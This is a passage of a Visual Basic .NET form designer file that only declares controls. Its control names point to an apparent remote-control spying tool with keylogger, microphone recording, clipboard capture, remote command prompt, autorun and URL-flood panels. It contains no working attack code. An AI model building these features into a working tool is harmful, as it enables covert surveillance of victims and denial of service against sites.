    Friend WithEvents rbtHi As System.Windows.Forms.RadioButton
    Friend WithEvents cmdAvviAs As System.Windows.Forms.Button
    Friend WithEvents lblPDAVV As System.Windows.Forms.Label
    Friend WithEvents txtProcessoDAA As System.Windows.Forms.TextBox
    Friend WithEvents cmdTerminaPB As System.Windows.Forms.Button
    Friend WithEvents cmdTerminaPN As System.Windows.Forms.Button
    Friend WithEvents cmdCancellaL As System.Windows.Forms.Button
    Friend WithEvents cmdOttieniP As System.Windows.Forms.Button
    Friend WithEvents tbcPannello As System.Windows.Forms.TabControl
    Friend WithEvents lblPerW As System.Windows.Forms.Label
    Friend WithEvents chkImmSizeW As System.Windows.Forms.CheckBox
    Friend WithEvents cmdRIMMW As System.Windows.Forms.Button
    Friend WithEvents tmrPannWeb As System.Windows.Forms.Timer
    Friend WithEvents cxmstrWeb As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents StartListeningToolStripMenuItem2 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseConnectionToolStripMenuItem3 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents tmrDatiWeb As System.Windows.Forms.Timer
    Friend WithEvents tbpKey As System.Windows.Forms.TabPage
    Friend WithEvents txtKey As System.Windows.Forms.TextBox
    Friend WithEvents cmdSaveKs As System.Windows.Forms.Button
    Friend WithEvents cdSTARTOnK As System.Windows.Forms.Button
    Friend WithEvents cmdGetK As System.Windows.Forms.Button
    Friend WithEvents cmdInstallK As System.Windows.Forms.Button
    Friend WithEvents cxmstrKey As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents StartListeningToolStripMenuItem3 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseConnectionToolStripMenuItem4 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents tmrDatiKey As System.Windows.Forms.Timer
    Friend WithEvents tmrPannKey As System.Windows.Forms.Timer
    Friend WithEvents cmdStopK As System.Windows.Forms.Button
    Friend WithEvents lblStppK As System.Windows.Forms.Label
    Friend WithEvents picKB As System.Windows.Forms.PictureBox
    Friend WithEvents lblOKS As System.Windows.Forms.Label
    Friend WithEvents tbMicroP As System.Windows.Forms.TabPage
    Friend WithEvents grpS1 As System.Windows.Forms.GroupBox
    Friend WithEvents lblTotKbS As System.Windows.Forms.Label
    Friend WithEvents grpLocRec As System.Windows.Forms.GroupBox
    Friend WithEvents cmdStopRecLO As System.Windows.Forms.Button
    Friend WithEvents cmdREcLoc As System.Windows.Forms.Button
    Friend WithEvents prgDatS As System.Windows.Forms.ProgressBar
    Friend WithEvents lblArrDat As System.Windows.Forms.Label
    Friend WithEvents cmdStopRec As System.Windows.Forms.Button
    Friend WithEvents cmdStartRec As System.Windows.Forms.Button
    Friend WithEvents lblRecTim As System.Windows.Forms.Label
    Friend WithEvents lblRecT As System.Windows.Forms.Label
    Friend WithEvents lblTOTKbLo As System.Windows.Forms.Label
    Friend WithEvents picSound As System.Windows.Forms.PictureBox
    Friend WithEvents tbpChat As System.Windows.Forms.TabPage
    Friend WithEvents txtRName As System.Windows.Forms.TextBox
    Friend WithEvents lblRN As System.Windows.Forms.Label
    Friend WithEvents txtName As System.Windows.Forms.TextBox
    Friend WithEvents lblName As System.Windows.Forms.Label
    Friend WithEvents txtChatBox As System.Windows.Forms.TextBox
    Friend WithEvents txtChatB As System.Windows.Forms.TextBox
    Friend WithEvents cmdSendC As System.Windows.Forms.Button
    Friend WithEvents cmdCloseC As System.Windows.Forms.Button
    Friend WithEvents cmdOpenC As System.Windows.Forms.Button
    Friend WithEvents lblTipChat As System.Windows.Forms.Label
    Friend WithEvents tbPorts As System.Windows.Forms.TabPage
    Friend WithEvents grpPS As System.Windows.Forms.GroupBox
    Friend WithEvents lbl1 As System.Windows.Forms.Label
    Friend WithEvents nudSD As System.Windows.Forms.NumericUpDown
    Friend WithEvents lbl6 As System.Windows.Forms.Label
    Friend WithEvents nudD As System.Windows.Forms.NumericUpDown
    Friend WithEvents lbl5 As System.Windows.Forms.Label
    Friend WithEvents nudU As System.Windows.Forms.NumericUpDown
    Friend WithEvents lbl4 As System.Windows.Forms.Label
    Friend WithEvents NudK As System.Windows.Forms.NumericUpDown
    Friend WithEvents lbl3 As System.Windows.Forms.Label
    Friend WithEvents nudW As System.Windows.Forms.NumericUpDown
    Friend WithEvents lbl2 As System.Windows.Forms.Label
    Friend WithEvents nudS As System.Windows.Forms.NumericUpDown
    Friend WithEvents picF As System.Windows.Forms.PictureBox
    Friend WithEvents cxmstrClip As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents AddValueToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DeleteSelectedToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ClearListToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ClearListToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents tbClip As System.Windows.Forms.TabPage
    Friend WithEvents lblCTip As System.Windows.Forms.Label
    Friend WithEvents txtVisNoLis As System.Windows.Forms.TextBox
    Friend WithEvents cmdCloSet As System.Windows.Forms.Button
    Friend WithEvents cmdSet As System.Windows.Forms.Button
    Friend WithEvents txtData As System.Windows.Forms.TextBox
    Friend WithEvents lstwClipboard As System.Windows.Forms.ListView
    Friend WithEvents cxmstrSou As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents StartListeningToolStripMenuItem4 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseConnectionToolStripMenuItem5 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents tmrPannSuono As System.Windows.Forms.Timer
    Friend WithEvents tmrDatiSuono As System.Windows.Forms.Timer
    Friend WithEvents grpVolR As System.Windows.Forms.GroupBox
    Friend WithEvents cmdMuteR As System.Windows.Forms.Button
    Friend WithEvents cmdSetVR As System.Windows.Forms.Button
    Friend WithEvents cmdGetDS As System.Windows.Forms.Button
    Friend WithEvents SendYourClipboardToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents bkwSD As System.ComponentModel.BackgroundWorker
    Friend WithEvents StartWavFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents cmdSetAlC As System.Windows.Forms.Button
    Friend WithEvents tbDD As System.Windows.Forms.TabPage
    Friend WithEvents cmdStartSite As System.Windows.Forms.Button
    Friend WithEvents txtURLR As System.Windows.Forms.TextBox
    Friend WithEvents lblRTO As System.Windows.Forms.Label
    Friend WithEvents grpFlloo As System.Windows.Forms.GroupBox
    Friend WithEvents cmdstaFlo As System.Windows.Forms.Button
    Friend WithEvents nudFloo As System.Windows.Forms.NumericUpDown
    Friend WithEvents lblTimes As System.Windows.Forms.Label
    Friend WithEvents txtUFlo As System.Windows.Forms.TextBox
    Friend WithEvents lblUFlo As System.Windows.Forms.Label
    Friend WithEvents lblTipFloo As System.Windows.Forms.Label
    Friend WithEvents lblTipTxtAck As System.Windows.Forms.Label
    Friend WithEvents txtacK As System.Windows.Forms.TextBox
    Friend WithEvents tbCMD As System.Windows.Forms.TabPage
    Friend WithEvents txtCMDOUT As System.Windows.Forms.TextBox
    Friend WithEvents cmdCCMDO As System.Windows.Forms.Button
    Friend WithEvents cmdSECMD As System.Windows.Forms.Button
    Friend WithEvents txtCOMCMD As System.Windows.Forms.TextBox
    Friend WithEvents cmdSetPorts As System.Windows.Forms.Button
    Friend WithEvents tbpRegRun As System.Windows.Forms.TabPage
    Friend WithEvents lstRunSo As System.Windows.Forms.ListBox
    Friend WithEvents cmdGetRunC As System.Windows.Forms.Button
    Friend WithEvents cmdCleLst As System.Windows.Forms.Button
    Friend WithEvents AddFileInAutorunFolderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents cmdClrTxt As System.Windows.Forms.Button
    Friend WithEvents chkHCR As System.Windows.Forms.CheckBox
    Friend WithEvents cmdGETOUT As System.Windows.Forms.Button
End Class
